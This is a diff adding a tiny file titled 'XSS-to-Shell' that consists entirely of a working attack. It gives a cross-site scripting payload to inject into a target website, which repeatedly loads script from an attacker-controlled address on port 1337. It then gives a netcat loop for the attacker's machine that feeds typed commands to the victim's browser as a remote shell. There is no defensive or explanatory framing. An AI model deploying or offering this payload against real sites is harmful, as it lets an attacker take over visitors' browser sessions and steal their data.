@@ -1,0 +1,7 @@
+# XSS-to-Shell
+
+Website to attack
+<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//192.168.78.129:1337";d.body.appendChild(z)},0)</script>
+
+Attackers machine
+while :; do printf "@x11>$ "; read c; echo $c | nc -vvlp 1337 >/dev/null; done
